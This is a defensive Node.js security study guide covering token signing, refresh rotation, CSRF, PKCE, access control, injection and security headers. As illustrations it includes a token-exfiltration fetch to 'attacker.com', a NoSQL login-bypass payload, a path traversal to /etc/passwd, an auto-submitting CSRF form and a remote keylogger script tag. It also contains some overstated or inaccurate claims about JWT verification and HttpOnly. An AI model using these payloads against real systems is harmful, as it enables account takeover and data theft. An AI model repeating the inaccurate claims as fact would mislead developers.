# Security, Authentication & Authorization

---


# Section 1: Token Cryptography & The Split-Token Architecture

The default JWT algorithms is insufficient. The Split-Token architecture separates concerns: a short-lived, cryptographically signed Access Token for microservice authorization, and a long-lived, opaque Refresh Token for session management.

## Access Tokens: Asymmetric Cryptography (EdDSA)

Symmetric algorithms (`HS256`) share the same secret key for signing and verification. If a single microservice is compromised, the attacker can mint valid JWTs for the entire system. Asymmetric algorithms (like `RS256` or `EdDSA`) use a private key to sign (kept only on the Auth service) and a public key to verify (distributed to all microservices).

**EdDSA (Ed25519)** is the modern standard over RSA. It offers smaller key sizes, faster generation, and immunity to timing attacks.

```javascript
// Using the 'jose' library for EdDSA JWT generation
import * as jose from 'jose';
import crypto from 'crypto';

// 1. Generate Key Pair (Run once securely, store in KMS/Vault)
const { publicKey, privateKey } = await jose.generateKeyPair('EdDSA');

// 2. Minting the Access Token (Auth Service)
const generateAccessToken = async (userId, roles) => {
  const jwt = await new jose.SignJWT({ 'urn:example:role': roles })
    .setProtectedHeader({ alg: 'EdDSA' })
    .setIssuedAt()
    .setIssuer('urn:example:issuer')
    .setAudience('urn:example:api')
    .setExpirationTime('15m') // 15-minute lifespan
    .setSubject(userId)
    .sign(privateKey);
  
  return jwt;
};

// 3. Verifying the Token (Any Microservice)
const verifyToken = async (jwt) => {
  try {
    const { payload } = await jose.jwtVerify(jwt, publicKey, {
      issuer: 'urn:example:issuer',
      audience: 'urn:example:api',
    });
    return payload; // Trust this payload statelessly
  } catch (err) {
    throw new Error('Invalid or expired token');
  }
};

```

## Refresh Tokens: Opaque Strings

Refresh tokens should **not** be JWTs. They do not need to carry claims; they only need to map to a database/Redis record. Using a high-entropy cryptographically secure pseudo-random string prevents attackers from decoding them to glean internal system logic.

```javascript
// Generating a secure Refresh Token
const generateRefreshToken = () => {
  return crypto.randomBytes(40).toString('hex');
};

```

---

<br>

# Section 2: Storage Mechanisms & Mitigating XSS / CSRF

If an attacker executes malicious JavaScript in your application (XSS), any token stored in `localStorage` or `sessionStorage` can be exfiltrated via `fetch('attacker.com?token=' + localStorage.getItem('token'))`.

## The Secure Cookie Baseline

Refresh tokens must be stored in `HttpOnly` cookies. This flag instructs the browser to hide the cookie from the JavaScript `document.cookie` API.

```javascript
// Express.js response setting the Refresh Token
res.cookie('refreshToken', newRefreshToken, {
  httpOnly: true, // Prevents XSS exfiltration
  secure: process.env.NODE_ENV === 'production', // HTTPS only
  sameSite: 'strict', // Mitigates CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
});

```

## Advanced CSRF Defense: Double Submit Cookie

If your frontend and backend share a root domain (e.g., `app.example.com` and `api.example.com`), `SameSite=Strict` is highly effective. However, if they are completely decoupled across domains, you must implement the Double Submit Cookie pattern to prevent Cross-Site Request Forgery.

```javascript
// 1. Generate a CSRF token upon login/app load
const csrfToken = crypto.randomBytes(32).toString('hex');
res.cookie('csrfSecret', csrfToken, {
  httpOnly: false, // JavaScript MUST be able to read this
  secure: true,
  sameSite: 'none' // Required for cross-domain
});

// 2. Frontend reads the cookie and sends it in a header
// axios.defaults.headers.common['X-CSRF-Token'] = getCookie('csrfSecret');

// 3. Backend CSRF Middleware
const csrfMiddleware = (req, res, next) => {
  // Safe methods don't modify state
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const headerToken = req.headers['x-csrf-token'];
  const cookieToken = req.cookies.csrfSecret;

  // Attackers can't read the cookie to place it in the header due to CORS
  if (!headerToken || !cookieToken || headerToken !== cookieToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  next();
};

```

---

<br>

# Section 3: Refresh Token Rotation & Threat Detection

Token rotation ensures that every time a Refresh Token is used, it is discarded and replaced. This shrinks the attack window.

## The Stolen Token Scenario

1. Attacker steals User A's Refresh Token.
2. Attacker uses it to get an Access Token. The server rotates it, giving the Attacker the *new* Refresh Token.
3. User A returns to the app and tries to use their *old, now-invalid* Refresh Token.
4. **The Anomaly:** The server recognizes that a previously used token is being presented again. This means the token family is compromised.

## Redis Implementation

We map an `accountId` to a `familyId`. The `familyId` holds the *currently active* Refresh Token.

```javascript
import Redis from 'ioredis';
const redis = new Redis();

const rotateToken = async (accountId, presentedToken) => {
  const familyKey = `auth:family:${accountId}`;
  const activeToken = await redis.get(familyKey);

  if (!activeToken) {
    throw new Error('No active session found.');
  }

  // Anomaly Detection: The token presented doesn't match the active one in Redis
  if (presentedToken !== activeToken) {
    // A stolen token is being used, or a legitimate user is using an old token.
    // ACTION: Revoke the entire family immediately.
    await redis.del(familyKey);
    console.warn(`SECURITY ALERT: Token reuse detected for account ${accountId}`);
    throw new Error('Session compromised. Please log in again.');
  }

  // Happy Path: Token is valid. Rotate it.
  const newRefreshToken = crypto.randomBytes(40).toString('hex');
  
  // Update Redis with the new token, resetting the 7-Section TTL
  await redis.set(familyKey, newRefreshToken, 'EX', 7 * 24 * 60 * 60);

  return newRefreshToken;
};

```

---

<br>

# Section 4: Modern OAuth 2.0 (Authorization Code with PKCE)

The Implicit Flow (where tokens are returned directly in the URL hash) is deprecated because URL fragments can be leaked via browser history, server logs, or the `Referer` header.

Modern Node.js backends must enforce the **Authorization Code Flow with Proof Key for Code Exchange (PKCE)**. PKCE ensures that the client exchanging the code is the exact same client that requested it.

## The PKCE Cryptographic Handshake

1. **Client creates a Code Verifier:** A high-entropy random string.
2. **Client creates a Code Challenge:** `BASE64URL-ENCODE(SHA256(ASCII(code_verifier)))`
3. Client sends the user to the Authorization Server with the `code_challenge`.
4. User authenticates. Server returns a temporary `Authorization Code`.
5. Client sends the `Authorization Code` to the backend, ALONG WITH the original plaintext `code_verifier`.
6. **The Validation:** The server hashes the `code_verifier` itself. If it matches the `code_challenge` provided in Step 3, the server knows the request wasn't intercepted.

```javascript
// Backend validation of a PKCE flow exchange
const crypto = require('crypto');

const verifyPKCE = (storedChallenge, providedVerifier) => {
  const hashedVerifier = crypto
    .createHash('sha256')
    .update(providedVerifier)
    .digest('base64url'); // Base64URL encoding is strictly required by the spec

  return hashedVerifier === storedChallenge;
};

```

---

<br>

# Section 5: Granular Role-Based Access Control (RBAC)

RBAC at the Staff level means writing middleware that scales across hundreds of routes without duplicating logic, and failing securely (returning 403, not 401).

## Express/Fastify Middleware Implementation

```javascript
// Access levels mapped to numeric weights for easy hierarchy
const ROLE_WEIGHTS = {
  viewer: 10,
  editor: 20,
  admin: 30,
  super_admin: 100
};

// Middleware factory
const requireMinimumRole = (minimumRole) => {
  return (req, res, next) => {
    // Ensure the authentication middleware has already run and populated req.user
    if (!req.user || !req.user.role) {
      return res.status(401).json({ error: 'Unauthenticated' });
    }

    const userWeight = ROLE_WEIGHTS[req.user.role] || 0;
    const requiredWeight = ROLE_WEIGHTS[minimumRole];

    if (!requiredWeight) {
      throw new Error(`System Error: Role ${minimumRole} is not defined.`);
    }

    if (userWeight >= requiredWeight) {
      return next(); // User authorized
    }

    // Fail securely
    return res.status(403).json({ error: 'Insufficient privileges' });
  };
};

// Route Usage
app.post('/api/documents', requireMinimumRole('editor'), documentController.create);
app.delete('/api/documents/:id', requireMinimumRole('admin'), documentController.remove);

```

---

<br>

# Section 6: Defending the Database (NoSQL Injection)

In MongoDB, data is queried using JSON objects. If an attacker passes a MongoDB query operator (`$gt`, `$ne`, `$where`) in a JSON payload where a simple string was expected, they can alter the query logic entirely.

**Vulnerable Code:**

```javascript
// If req.body = { email: "admin@corp.com", password: { "$gt": "" } }
// The database returns the admin user because every password is greater than an empty string.
const user = await User.findOne({ 
  email: req.body.email, 
  password: req.body.password 
});

```

## Defense-in-Depth

**1. Strict Schema Validation (Zod)**
Never pass raw `req.body` directly to a database ORM/Driver. Validate that the input is exactly a string.

```javascript
import { z } from 'zod';

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(128) // Rejects objects like { "$gt": "" }
});

const loginHandler = (req, res) => {
  const parsedData = loginSchema.safeParse(req.body);
  if (!parsedData.success) {
    return res.status(400).json({ errors: parsedData.error.flatten() });
  }
  // Proceed securely using parsedData.data
};

```

**2. Query Sanitization**
For routes with highly dynamic filters where strict schemas are difficult, use sanitization to strip keys starting with `$`.

```javascript
import sanitize from 'mongo-sanitize';

// Strips out any keys that start with '$' in the input
const cleanId = sanitize(req.params.id); 
const item = await Item.findById(cleanId);

```

---

<br>

# Section 7: Distributed Rate Limiting & Proxy Configuration

In a modern orchestrated environment (Kubernetes/ECS), your Node application runs across multiple containers. An in-memory rate limiter only tracks requests per pod, rendering global limits useless.

## Redis Sliding Window Implementation

The Token Bucket or Sliding Window Log algorithms must be used to ensure accurate, atomic counting across all pods.

```javascript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

const redisClient = new Redis(process.env.REDIS_URL);

export const globalRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per window
  standardHeaders: true, 
  legacyHeaders: false,
  store: new RedisStore({
    sendCommand: (...args) => redisClient.call(...args),
  }),
});

```

## The IP Spoofing Pitfall (Trust Proxy)

If your Node app sits behind an NGINX proxy or AWS ALB, `req.ip` will be the internal IP of the proxy. To fix this, developers often enable Express's proxy trust feature.

**Dangerous Configuration:**

```javascript
// DO NOT DO THIS. It tells Express to trust ANY X-Forwarded-For header.
// Attackers can send a fake header (e.g., X-Forwarded-For: 12.34.56.78) to bypass rate limits.
app.set('trust proxy', true); 

```

**Secure Configuration:**
Strictly define the IP address or subnet of your load balancer. Express will only trust the `X-Forwarded-For` header if the immediate connection comes from this allowed IP.

```javascript
// Only trust requests originating from the internal VPC subnet
app.set('trust proxy', '10.0.0.0/16'); 

// Alternatively, configure based on proxy hop count if behind a known CDN
// app.set('trust proxy', 1); // Trust the first proxy in front of Node

```

---

# Section 8: Revision


This is a deeper, architecturally focused expansion of these core concepts. When building at the Staff level, you must anticipate edge cases, network unreliability, and advanced persistent threats. Here are the expanded, real-world notes for your study guide.

---

## 1. Stateless Authentication Mechanics & Key Management

The core premise of stateless authentication is shifting trust from a stateful database lookup to cryptographic math.

### The Real-World Scenario: A Global E-Commerce Platform

Imagine a platform with services deployed globally: an Auth Service in Virginia, a Cart Service in Frankfurt, and a Recommendation Service in Tokyo. If authentication relies on a central database, a user in Tokyo hitting the Recommendation Service suffers massive latency because the service must query Virginia to validate the session.

Stateless JWTs solve this. The Tokyo service doesn't need to ask Virginia if the user is valid; it verifies the cryptographic signature locally in milliseconds.

### Deep Dive: JWT Structure and Verification Math

A JWT is not encrypted; it is just Base64Url encoded. Anyone can decode the payload. The security lies entirely in the **Signature**.

When the Auth Service mints a token, it performs this operation:
`Signature = Hash(Base64(Header) + "." + Base64(Payload), SecretKey)`

When the Tokyo microservice receives the token, it performs the exact same operation. If the signature it generates matches the signature attached to the token, the token is mathematically proven to be authentic and unaltered.

### Symmetric (HS256) vs. Asymmetric (RS256 / EdDSA)

* **Symmetric (The Anti-Pattern at Scale):** Uses one secret string (e.g., `super_secret_key_123`) to both sign and verify. If you share this key with the Cart and Recommendation services, and the Cart service is breached, the attacker extracts the key. They can now mint forged "Admin" tokens. The blast radius is total system compromise.
* **Asymmetric (The Enterprise Standard):** Uses a Key Pair.
* **Private Key:** Kept *only* on the Auth Service in a secure vault. Used exclusively to sign tokens.
* **Public Key:** Distributed freely to all microservices. Used exclusively to verify tokens.
* *Real-World Defense:* If the Cart service is breached, the attacker only gets the Public Key. They cannot forge tokens. The blast radius is contained.



> **JWKS (JSON Web Key Sets)**
> You never hardcode the Public Key into your microservices. Instead, the Auth Service exposes a `/.well-known/jwks.json` endpoint. Microservices fetch the public keys on startup and cache them. This allows the Auth Service to rotate its private keys dynamically without requiring a redeployment of the entire microservice fleet.

---

## 2. Secure Token Rotation: The "Grace Period" Architecture

We know the standard: Access Tokens live for 15 minutes, Refresh Tokens live for 7 days in Redis. When a Refresh Token is used, it is deleted and a new one is issued. If a used token is presented again, the system detects a theft and revokes the entire session.

### The Real-World Edge Case: The "Spotty 5G" Problem

In the real world, networks are unreliable.

1. A legitimate user's mobile app sends a `/refresh` request.
2. The server successfully rotates the token in Redis and sends the new token back.
3. **The Failure:** The user's cell signal drops, and the HTTP response is lost.
4. The user's app automatically retries the `/refresh` request with the *old* token.
5. **The Catastrophe:** The server sees an old token being reused, assumes the user is an attacker, and wipes the session. The legitimate user is abruptly logged out.

### The Solution: Redis Grace Windows

To prevent false positives, you must implement a "Grace Period" in your Redis logic.

When a token is rotated, you do not immediately delete the old token's hash. Instead, you move it to a temporary state with a strict 5-second Time-To-Live (TTL).

```javascript
// Pseudocode for Grace Period Rotation
const rotateToken = async (userId, oldToken) => {
  const familyKey = `auth:${userId}:family`;
  
  // 1. Check if the token was just rotated (is in the grace window)
  const justRotated = await redis.get(`grace:${oldToken}`);
  if (justRotated) {
    return justRotated; // Safely return the already-generated new token
  }

  // 2. Anomaly Check: Is this an old, compromised token?
  const activeToken = await redis.get(familyKey);
  if (activeToken !== oldToken) {
    await redis.del(familyKey); // Nuke the session
    throw new Error('Security Breach: Token family revoked.');
  }

  // 3. Happy Path: Generate new token
  const newToken = generateSecureString();
  
  // 4. Update Redis and create the Grace Window for network retries
  const multi = redis.multi();
  multi.set(familyKey, newToken, 'EX', 7 * 24 * 60 * 60); // 7 days
  multi.set(`grace:${oldToken}`, newToken, 'EX', 5); // 5-second grace window
  await multi.exec();

  return newToken;
}

```

---

## 3. RBAC vs. ABAC: Scaling Authorization

Authorization often starts simple and becomes an architectural nightmare as business requirements grow.

### Role-Based Access Control (RBAC): The Limits

RBAC works purely on the user's title (`Admin`, `Manager`, `User`).

* **The Scenario:** A hospital application. You create a `Doctor` role that grants access to the `/api/patients` endpoint.
* **The Breakdown:** Dr. Smith logs in. Because he has the `Doctor` role, he can view *any* patient in the hospital, including patients he isn't treating. RBAC cannot handle ownership or context; it only handles capability.

### Attribute-Based Access Control (ABAC): Contextual Security

ABAC evaluates a matrix of attributes dynamically:

* **Subject Attributes:** Who is the user? (ID: 101, Dept: Oncology)
* **Resource Attributes:** What is being accessed? (Patient: 999, Treating_Physician_ID: 101)
* **Environment Attributes:** What is the context? (Time: 2:00 AM, IP: Internal Network)

**Real-World ABAC Middleware Implementation:**
Instead of hardcoding rules, enterprise systems use external policy engines like **Open Policy Agent (OPA)** written in Rego, or complex custom middleware.

```javascript
// A contextual ABAC middleware for Node.js
const canViewPatientRecord = async (req, res, next) => {
  const doctorId = req.user.id;
  const patientRecordId = req.params.id;

  // 1. Fetch Resource Attributes
  const patient = await db.patients.findById(patientRecordId);

  // 2. Evaluate Policy Matrix
  const isTreatingPhysician = patient.primaryDoctorId === doctorId;
  const isEmergencyOverride = req.user.roles.includes('ER_Staff') && patient.status === 'Critical';
  
  // 3. Enforce Environment Constraints (e.g., no viewing from outside the hospital VPN)
  const isInternalIP = req.ip.startsWith('10.0.');

  if ((isTreatingPhysician || isEmergencyOverride) && isInternalIP) {
    return next();
  }

  // 403 Forbidden - Not 401. They are authenticated, but unauthorized for this specific context.
  return res.status(403).json({ error: 'Policy Deny: Unauthorized context' });
};

```

---

## 4. OWASP Top 10 Node.js Remediation Details

Node.js is uniquely vulnerable to specific vectors due to its asynchronous nature and heavy reliance on JSON and JavaScript objects.

### 1. NoSQL Injection (NoSQLi)

* **The Real-World Scenario:** A competitor builds a bot to scrape your platform. They hit your login endpoint with a mutated JSON payload: `{"email": "admin@saas.com", "password": {"$gt": ""}}`.
* **The Mechanics:** In MongoDB, `{"$gt": ""}` means "greater than an empty string." Because passwords are strings, every password in the database matches this condition. The DB evaluates the query to true and logs the attacker in as the Admin.
* **The Defense:** Never pass `req.body` directly to Mongoose/MongoDB. Use **Zod** to coerce and strictly validate types.
```javascript
// Zod will immediately throw an error because "$gt" makes the password an object, not a string.
const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(12) 
});

```



### 2. Cross-Site Scripting (XSS)

* **The Real-World Scenario:** A user uploads a malicious SVG file as their profile picture. SVGs are XML and can contain `<script>` tags. When an Admin views the user's profile, the browser renders the SVG, executes the script, and silently emails the Admin's `localStorage` (containing their JWT) to the attacker.
* **The Defense:**
1. **HttpOnly Cookies:** By storing tokens in HttpOnly cookies, `document.cookie` cannot read them, rendering XSS token theft impossible.
2. **Content-Security-Policy (CSP):** Configure Helmet to enforce `script-src 'self'`. This tells the browser to outright refuse to execute any script that didn't originate from your exact domain.



### 3. Cross-Site Request Forgery (CSRF)

* **The Real-World Scenario:** A user logs into their bank (which uses cookies). They open a new tab and visit a blog. The blog contains a hidden form: `<form action="[https://bank.com/transfer](https://bank.com/transfer)" method="POST"><input name="to" value="Attacker"><input name="amount" value="1000"></form>`. The blog uses JavaScript to auto-submit the form. The browser helpfully attaches the bank's authentication cookies, and the transfer succeeds.
* **The Defense:**
1. **SameSite=Strict:** Instruct the browser: "If the request did not originate from `bank.com`, do not attach the cookie."
2. **Double-Submit Token:** If the frontend and backend live on different subdomains (preventing `SameSite=Strict`), the server sends a secondary, non-HttpOnly cookie containing a random hash. The frontend reads this hash and sends it back in a custom header (e.g., `X-CSRF-Token`). The server verifies the cookie and the header match.



### 4. Path Traversal

* **The Real-World Scenario:** You build an endpoint to serve invoice PDFs: `/api/invoices?file=march_invoice.pdf`. An attacker changes the URL to `/api/invoices?file=../../../../etc/passwd`. `fs.readFile()` follows the path up the directory tree and serves the server's root password file.
* **The Defense:** Never trust user input in file system operations. Sanitize the input to strip directory traversal sequences, and explicitly verify the resolved path.
```javascript
const path = require('path');

app.get('/api/invoices', (req, res) => {
  // 1. path.basename() strips out all directories, leaving ONLY the filename
  const safeFileName = path.basename(req.query.file); 

  // 2. Resolve the absolute path
  const targetPath = path.resolve(__dirname, 'secure_invoices', safeFileName);

  // 3. Final verification: Ensure the path still lives inside the intended folder
  const expectedDir = path.resolve(__dirname, 'secure_invoices');
  if (!targetPath.startsWith(expectedDir)) {
     return res.status(403).send('Invalid file path');
  }

  res.sendFile(targetPath);
});

```

## 5. API Security Headers (Helmet.js) & CORS Policies

Browsers are inherently hostile execution environments. By default, they are overly permissive to ensure backward compatibility with the legacy web. Security headers and CORS are your mechanisms to restrict the browser's behavior and lock down the execution context.

### Helmet.js and HTTP Security Headers

Helmet.js is a collection of middleware functions that set secure HTTP response headers. At a Staff level, you do not just `app.use(helmet())`; you configure it explicitly to match your threat model.

* **Strict-Transport-Security (HSTS):** Forces the browser to strictly use HTTPS for the specified domain, even if the user types `http://`.
* *Real-World Context:* Without HSTS, a user on a public Starbucks Wi-Fi who types `yourbank.com` makes an initial HTTP request. A Man-in-the-Middle (MitM) attacker can intercept this, serve a fake login page, and steal credentials before the redirect to HTTPS ever happens (SSL Stripping). HSTS caches the HTTPS requirement in the browser.


* **Content-Security-Policy (CSP):** The ultimate defense against Cross-Site Scripting (XSS). It defines an allowlist of origins from which the browser is permitted to load resources (scripts, images, styles).
* *Real-World Context:* If a threat actor injects `<script src="[http://evil.com/keylogger.js](http://evil.com/keylogger.js)"></script>` into a comment section, a strong CSP (`script-src 'self'`) forces the browser to block the script because `evil.com` is not on the allowlist.


* **X-Frame-Options (XFO):** Prevents Clickjacking by dictating whether your site can be rendered inside a `<frame>`, `<iframe>`, or `<object>`.
* *Real-World Context:* An attacker creates a "Win a Free iPhone" button and layers an invisible iframe of your application's "Transfer Funds" button directly over it. Set this to `DENY` or `SAMEORIGIN` to block the iframe rendering.



### Cross-Origin Resource Sharing (CORS)

CORS is not a security boundary for your server; it is a security boundary for the *browser*. The Same-Origin Policy (SOP) prevents a script on `attacker.com` from reading data from `api.yourbank.com`. CORS is the mechanism to explicitly poke holes in the SOP.

**The Preflight (`OPTIONS`) Request:**
When a frontend makes a "complex" request (e.g., uses `application/json`, sends custom headers, or uses methods like `PUT`/`DELETE`), the browser pauses. It sends an HTTP `OPTIONS` request to the server asking, "Are you okay with this?" If the server replies with the correct CORS headers, the actual request proceeds.

**The Configuration Trap:**

```javascript
// DANGEROUS: Never do this in production
app.use(cors({ origin: '*' }));

```

If you set `origin: '*'` and a client tries to send credentials (cookies or authorization headers), the browser will actively block the response. The CORS specification strictly forbids wildcards when `credentials: true` is set.

* *Real-World Solution:* You must dynamically validate the origin. Maintain an array of allowed origins (e.g., your staging and production frontend URLs). When a request comes in, check the `Origin` header against your array. If it matches, echo that exact origin back in the `Access-Control-Allow-Origin` response header.

---

## 6. Rate-Limiting Algorithms at Scale (Redis)

Rate limiting protects your infrastructure from brute-force attacks, DDoS, and noisy neighbors. In a distributed Node.js microservice architecture, in-memory limiters fail because state is not shared across pods. Redis is the standard centralized state store, but the algorithm you choose dictates your system's resilience.

### Fixed Window Counter

* **Mechanism:** Time is divided into rigid windows (e.g., 00:00 to 00:01). A Redis key counts requests for an IP during that exact minute. When the minute ticks over, the counter drops to zero.
* **The Flaw (Boundary Effect):** If the limit is 100 requests per minute, an attacker can send 100 requests at 00:00:59, and another 100 requests at 00:01:01. The server just absorbed 200 requests in 2 seconds, potentially overwhelming the database.

### Sliding Window Log

* **Mechanism:** Instead of a counter, every request's timestamp is logged in a Redis Sorted Set (`ZSET`). To check the limit, the algorithm drops all timestamps older than 1 minute, and counts the remaining elements.
* **The Flaw:** Highly accurate and solves the boundary effect, but terrible for memory and performance. Storing a timestamp for every single API call across millions of users will saturate Redis memory rapidly.

### Token Bucket (The Industry Standard)

This is the algorithm used by AWS, Stripe, and modern API gateways. It balances accuracy, memory efficiency, and the reality of web traffic (burstiness).

* **Mechanism:** Imagine a bucket that holds a maximum of 100 tokens (Burst Capacity). Every second, a background process adds 2 tokens to the bucket (Refill Rate). Every API request removes 1 token. If the bucket is empty, the request is dropped (429 Too Many Requests).
* **Real-World Context:** An e-commerce API. When a user loads a dashboard, the SPA might fire 15 concurrent requests to fetch widgets, profile data, and cart totals. The Token Bucket handles this burst perfectly because the bucket is full. However, if a scraper tries to pull 50 pages a second, they quickly drain the bucket and are clamped down to the refill rate (2 requests per second).
* **Implementation:** Executed via Redis Lua scripts to ensure the check-and-decrement operation is entirely atomic, preventing race conditions when thousands of requests hit simultaneously.

---

## 7. Cryptography & Secrets Management

At the Staff level, you must distinguish between data in transit (TLS), data at rest (database encryption), and data in use (application-level memory).

### Hashing vs. Encryption

* **Hashing** is one-way. You cannot reverse a hash back to the original password. Used for password verification.
* **Encryption** is two-way. You use a key to lock the data, and the same (or paired) key to unlock it. Used for sensitive PII like Social Security Numbers or credit card data.

### Hashing: Bcrypt Tuning and Hardware Evolution

Bcrypt is designed to be intentionally slow to thwart offline dictionary and brute-force attacks using GPUs.

* **The Work Factor (Cost):** The cost factor is logarithmic. A cost of 10 means $2^{10}$ key expansion rounds. A cost of 12 means $2^{12}$ rounds (four times slower).
* **Real-World Context:** As hardware gets faster, a cost of 10 (standard in 2015) is now vulnerable to specialized cracking rigs. You should tune your work factor so that hashing takes roughly 250-500 milliseconds on your production servers.
* **The Upgrade Strategy:** When increasing the cost factor from 10 to 12, you do not force all users to reset their passwords. Instead, when a user successfully logs in, you verify their cost-10 hash, immediately re-hash the plaintext password in memory with cost-12, and update the database transparently.

### Application-Level Encryption (AES-256-GCM)

If your database is compromised or a snapshot is leaked, Disk-Level Encryption (like AWS EBS encryption) will not protect you — the data is unlocked while the database is running.

You must encrypt highly sensitive fields at the application layer *before* saving to the database. Use authenticated encryption like AES-256-GCM. GCM adds an authentication tag; if an attacker alters the encrypted database string even slightly, the decryption function will throw an error rather than returning garbled data, protecting against ciphertext manipulation.

### Secure Secrets Management

`.env` files injected via CI/CD pipelines are a massive risk if a server is breached (Directory Traversal can leak the `.env` file).

* **Real-World Context:** Use a dedicated secrets manager (AWS Secrets Manager, HashiCorp Vault). The application boots, uses an IAM role (machine identity) to authenticate with the Vault, and fetches the database credentials strictly into memory.
* **Dynamic Secrets:** For ultimate security, Vault can generate temporary database credentials on the fly. If your Node app needs DB access, Vault creates a Postgres user with a 1-hour lifespan. If the credentials leak, they are useless shortly after.

---

## 8. Session Hijacking & Secure Cookies

Session hijacking occurs when an attacker obtains a user's active session identifier (JWT or Session ID) and impersonates them.

### Attack Vectors

1. **Cross-Site Scripting (XSS):** Malicious JS reads the token.
2. **Network Sniffing:** Intercepting traffic on unencrypted Wi-Fi.
3. **Cross-Site Request Forgery (CSRF):** Forcing the browser to use the cookie against the user's will.

### The Defensive Cookie Matrix

| Attribute | What it Does | The Threat it Mitigates |
| --- | --- | --- |
| **`HttpOnly`** | Prevents client-side JavaScript (`document.cookie`) from accessing the cookie. | **XSS**. The attacker's script cannot read the token to exfiltrate it. |
| **`Secure`** | Forces the browser to only transmit the cookie over an encrypted HTTPS connection. | **Network Sniffing**. The cookie will never be sent over plaintext HTTP. |
| **`SameSite=Lax`** | Allows the cookie to be sent on top-level navigations (clicking a link). | **CSRF**. A solid default for general web apps. |
| **`SameSite=Strict`** | The cookie is NEVER sent on cross-origin requests. It only fires if the user is currently on your domain. | **Advanced CSRF**. Required for high-security applications (banking, auth endpoints). |

### Session Hijacking Prevention (Beyond the Cookie)

Even with secure cookies, if an attacker physically steals a laptop or compromises a device, they have the cookie.

* **Absolute vs. Idle Timeouts:**
* *Idle Timeout:* The session expires after 30 minutes of inactivity.
* *Absolute Timeout:* Regardless of activity, the session is killed after 12 hours. This limits the lifespan of a hijacked, actively-used session.


* **Session Fingerprinting (Context Binding):**
When the session is created, log the user's IP address and `User-Agent` alongside the session in Redis. On every request, verify that the current request matches the fingerprint.
* *Real-World Context & Flaw:* A user logs into your app on Wi-Fi (IP: A). They walk out the door, and their phone switches to 5G (IP: B). If your fingerprinting strictly binds to the IP, the user is suddenly logged out, ruining the UX.
* *The Staff-Level Solution:* Do not strictly block on IP changes. Instead, treat an IP change or a `User-Agent` change as a risk signal. If the IP changes, prompt the user for re-authentication (or an MFA challenge) *only* if they attempt a high-privilege action (like changing a password or transferring funds).